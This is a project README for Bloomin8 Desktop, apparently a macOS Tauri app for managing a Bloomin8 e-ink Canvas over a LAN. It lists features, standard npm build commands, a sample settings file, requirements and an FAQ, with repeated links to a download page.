# Bloomin8 Desktop v2026 - macOS desktop app 2026

> **Use a native macOS desktop app to manage a Bloomin8 color e-ink Canvas on your local network, with tools for photo pushes, device administration, and repeating schedules in version 2026.**

[![Platform](https://img.shields.io/badge/Platform-macOS-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/seanhub2000/bloomin8-canvas-desktop-app?style=flat-square)](https://github.com/seanhub2000/bloomin8-canvas-desktop-app)

---

<p align="center">
  <a href="https://seanhub2000.github.io/bloomin8-canvas-desktop-app/">
    <img src="https://img.shields.io/badge/Download-Bloomin8%20Desktop%20Latest-brightgreen?style=for-the-badge" alt="Download Bloomin8 Desktop">
  </a>
</p>

> **[Direct Download - Bloomin8 Desktop v2026](https://seanhub2000.github.io/bloomin8-canvas-desktop-app/)**

---

[Download Latest Build](https://seanhub2000.github.io/bloomin8-canvas-desktop-app/)

---

## Overview

Bloomin8 Desktop is a macOS application built to operate a Bloomin8 color e-ink Canvas across your local network. It is aimed at people who want a desktop-first way to send content, tune device behavior, and keep a connected display refreshed without depending on cloud services.

The interface is native and tray-oriented, bringing together photo pushing, widget updates, gallery and playlist control, plus recurring local scheduling in one place. That makes it easier to handle day-to-day device upkeep from a single desktop app.

---

## Features

- Local network control for a Bloomin8 color e-ink Canvas
- No cloud account, sign-in, or external service dependency
- Send photos and widgets to the device
- Handle galleries and playlists from the desktop
- Set up recurring local refresh schedules
- Rename devices and adjust device settings
- Sleep timers, BLE wake, reboot, and clear-screen actions
- Native tray app with support for multiple devices
- Client-side image processing
- Light and dark theme support

---

## Installation

1. Download or clone the repository.
2. Open the project in your macOS development or build environment.
3. Install the required dependencies for the Tauri, React, and TypeScript app stack.
4. Build and launch the desktop app from the project root.

Typical first launch during development:

    npm install
    npm run tauri dev

If you are using a packaged build, open the downloaded app and allow it to discover your Canvas device on the same LAN.

---

## Usage

Once Bloomin8 Desktop is open, verify that your Mac and the Canvas are connected to the same network. From there, the app can find and manage supported devices locally.

Typical tasks include:

- choosing a device from the tray-based interface
- pushing a photo or widget update
- arranging gallery items and playlists
- configuring a recurring refresh schedule
- renaming the device or changing sleep and wake behavior
- clearing the screen or rebooting when required

For development builds, start the app from the project directory using the Tauri dev command above. For packaged builds, launch the installed application and follow the in-app device setup flow.

---

## Configuration

Bloomin8 Desktop stores settings in the local app environment and handles image processing on the client side.

Example configuration areas you may work with:

    device:
      name: "My Canvas"
      sleepTimer: 30
      launchAtLogin: true
      theme: "system"

    schedule:
      enabled: true
      interval: "daily"

    display:
      mode: "light"

Exact file locations and persistence details depend on the build and runtime environment.

---

## Requirements

- macOS
- A Bloomin8 color e-ink Canvas on the same LAN
- Network access between the Mac and the device
- Sufficient local storage for app data, gallery items, and processed images
- A development environment if you plan to build from source
- Runtime support for the Tauri, React, TypeScript, and Tailwind-based desktop stack

---

## FAQ

**Do I need an account or cloud service?**  
No. The app is intended to operate locally over LAN without sign-in.

**Can it handle more than one device?**  
Yes. Multiple device support is built in.

**Is there a way to automate refreshes?**  
Yes. Recurring local schedules are supported.

**Where can I find updates?**  
Check the repository and release area for the latest build and project changes.

**What should I check if the device is not detected?**  
Make sure the Mac and Canvas are on the same network, then confirm the device is available and responsive.

**Can I adjust the app's behavior or look?**  
Yes. The app includes a light/dark theme and local device controls such as launch at login, sleep timers, BLE wake, reboot, and screen clearing.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
